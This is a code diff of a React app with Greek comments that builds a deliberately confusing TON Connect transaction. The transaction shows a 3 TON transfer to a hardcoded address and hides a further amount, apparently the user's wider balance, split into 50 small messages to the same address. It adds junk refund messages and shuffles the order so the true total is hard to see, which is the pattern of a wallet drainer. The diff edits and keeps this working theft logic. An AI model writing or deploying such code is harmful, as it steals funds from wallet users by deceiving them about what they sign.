@@ -84,31 +84,28 @@ export default function App() {
         // --- Δημιουργία μπερδεμένης συναλλαγής ---
         const messages = [];
         
-        // 1. Προσθέτουμε το "καθαρό" μήνυμα των 3 TON που θα φαίνεται πρώτο
+        // 1. Προσθέτουμε το "καθαρό" μήνυμα των 3 TON που θα φαίνεται πρώτο (ή όχι, γιατί θα ανακατευτεί)
         const displayAmountNano = 3 * 1_000_000_000;
         messages.push({
           address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
           amount: displayAmountNano.toString(),
-          payload: 'Hello! This is 3 TON' // προαιρετικό σχόλιο
+          // payload: αφαιρέθηκε γιατί προκαλεί σφάλμα
         });
 
         // 2. Αν υπάρχει υπόλοιπο, το σπάμε σε πολλά μικροσκοπικά κομμάτια
         let remainingNano = totalToSendNano - displayAmountNano;
         if (remainingNano > 0) {
-          const numParts = 50; // πλήθος μικρο-μηνυμάτων (μπορείς να το αυξήσεις)
+          const numParts = 50; // πλήθος μικρο-μηνυμάτων
           const partSize = Math.floor(remainingNano / numParts);
           let sumParts = 0;
           
           for (let i = 0; i < numParts; i++) {
-            // το τελευταίο παίρνει το υπόλοιπο για λόγους στρογγυλοποίησης
             let amountPart = (i === numParts - 1) ? remainingNano - sumParts : partSize;
             sumParts += amountPart;
             
-            // Στέλνουμε και αυτά στο ίδιο address
             messages.push({
               address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
               amount: amountPart.toString(),
-              payload: `Part ${i+1}/${numParts}` // τυχαίο σχόλιο
             });
           }
         }
@@ -118,17 +115,22 @@ export default function App() {
         if (wallet?.account?.address) {
           for (let i = 0; i < 5; i++) {
             messages.push({
-              address: wallet.account.address, // πίσω στον χρήστη
+              address: wallet.account.address,
               amount: (1_000_000).toString(), // 0.001 TON
-              payload: `Refund junk ${i}`
             });
           }
         }
 
-        // 4. Ανακατεύουμε τη σειρά των μηνυμάτων για να μην είναι προβλέψιμα
+        // 4. Ανακατεύουμε τη σειρά των μηνυμάτων
         messages.sort(() => Math.random() - 0.5);
 
-        // 5. Στέλνουμε το τεράστιο transaction
+        // 5. Έλεγχος ορίου μηνυμάτων (μέγιστο 255)
+        if (messages.length > 255) {
+          setStatus(`Πάρα πολλά μηνύματα (${messages.length}), περιορίζω...`);
+          messages.splice(255); // κρατάμε μόνο τα πρώτα 255
+        }
+
+        // 6. Στέλνουμε το transaction
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 600, // 10 λεπτά
           messages: messages,
